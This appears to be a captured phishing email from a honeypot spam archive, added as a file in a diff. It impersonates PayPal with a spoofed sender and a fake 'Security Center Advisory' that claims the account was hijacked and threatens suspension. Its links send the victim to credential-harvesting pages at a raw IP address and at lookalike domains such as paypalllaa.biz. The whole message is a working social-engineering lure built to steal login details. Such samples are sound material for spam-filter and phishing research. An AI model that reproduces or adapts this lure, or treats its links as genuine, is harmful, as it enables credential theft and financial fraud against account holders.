@@ -1,0 +1,159 @@
+Received: from unknown (HELO Selectaserver.local) (68.208.189.141)
+  by projecthoneypotmailserver with SMTP; 21 Jul 2005 15:24:24 -0000
+Received: by Selectaserver.local (Postfix, from userid 0)
+	id 25DB313ABD3; Thu, 21 Jul 2005 11:24:04 -0400 (EDT)
+To: projecthoneypot@projecthoneypot.org
+Subject: Urgent PayPal security notification
+From: security@paypal.com <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20050721152404.25DB313ABD3@Selectaserver.local>
+Date: Thu, 21 Jul 2005 11:24:04 -0400 (EDT)
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>New Page 1</title>
+<META NAME="GENERATOR" Content="Microsoft FrontPage 4.0">
+<TITLE></TITLE>
+<STYLE type=text/css>
+.dummy {}
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+LI {line-height: 120%;}
+UL.ppsmallborder {margin:10px 5px 10px 20px;}
+LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+UL.pp_narrow {margin:10px 5px 0px 40px;}
+hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+.pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+.pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+.pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+.pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;} 
+.pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;} 
+.pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;} 
+.pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;} 
+.pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;} 
+.pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+.pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+.pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+.pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.ppem106 {font-weight: 700;}
+</STYLE>
+
+</head>
+
+<body>
+
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD><A href="http://www.paypalllaa.biz/ppverify.php?cmd=_login-run&amp;mail=&amp;?motd=account_verify" 
+     ><IMG height=35 alt=PayPal src="http://images.paypal.com/en_US/i/logo/email_logo.gif" width=255 border=0></A> </TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD width="100%" background=http://images.paypal.com/images/bg_clk.gif><IMG height=29 src="http://images.paypal.com/images/pixel.gif" width=1 border=0></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://images.paypal.com/images/pixel.gif" width=1 border=0></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD width=400>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR vAlign=top>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD class=pp_heading align=left><BR> Security Center Advisory!</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><BR> We recently noticed one or more attempts to log in to your PayPal account from a 
+foreign IP address and we have reasons to belive that your account was hijacked 
+by a third party without your authorization. If you recently accessed your account while traveling, the unusual log in attempts
+may have been initiated by you.<BR>
+<BR>If you are the rightful holder of the account you must <B>click the link below</B> and then complete all steps from the following page as we try to verify your identity.<BR><BR>
+<TABLE cellSpacing=0 cellPadding=1 width="75%" align=left bgColor=#ffe65c border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=4 width="100%" align=center bgColor=#fffecd border=0>
+<TBODY>
+<TR>
+<TD class=pp_sansserif align=middle><A href="http://216.38.134.124/secured_site/cgi-bin/index.php" 
+                       >Click here to verify your account</A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR><BR><BR><BR>If you choose to ignore our request, you leave us no choise but to temporaly suspend 
+your account.<BR><BR>Thank you for using PayPal! The PayPal Team </TD></TR>
+<TR>
+<TD>
+<HR class=dotted>
+</TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD class=pp_footer>Please do not reply to this e-mail. Mail sent to this address cannot be answered. For assistance, <A href="http://www.paypal.com-cgi-bin.biz/ppverify.php?cmd=_login-run&amp;mail=&amp;?motd=account_verify" 
+                 >log in</A> to your PayPal account and choose the "Help" link in the footer of any page.<BR><BR class=h10>To receive email notifications in plain text instead of HTML, update your preferences <A href="https://www.paypal.com/row/PREFS-NOTI">here</A>. </TD></TR>
+<TR>
+<TD><IMG height=10 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 border=0></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><BR><SPAN class=pp_footer>PayPal Email ID PP697</SPAN></TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=1 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=10 border=0></TD>
+<TD vAlign=top width=190>
+<TABLE cellSpacing=0 cellPadding=1 width="100%" bgColor=#cccccc border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" bgColor=#eeeeee border=0>
+<TBODY>
+<TR>
+<TD class=pp_sidebartextbold align=middle>Protect Your Account Info</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD class=pp_sidebartext><BR>Make sure you never provide your password to fraudulent persons. <BR><BR>PayPal automatically encrypts your confidential information using the Secure Sockets Layer protocol (SSL) with an encryption key length of 128-bits (the highest level commercially available).<BR><BR>PayPal will never ask you to enter your password in an email.<BR><BR>For more information on protecting yourself from fraud, please review our Security Tips at http://www.paypal.com/securitytips<BR><IMG height=5 src="http://images.paypal.com/images/pixel.gif" width=1 border=0> </TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" bgColor=#eeeeee border=0>
+<TBODY>
+<TR>
+<TD class=pp_sidebartextbold align=middle>Protect Your Password</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD class=pp_sidebartext>You should <SPAN class=ppem106>never</SPAN> give your PayPal password to anyone, including PayPal employees.<BR><IMG height=5 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 border=0></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+</BODY>
+</HTML>
+
+
+
+
+
+
+
+
+
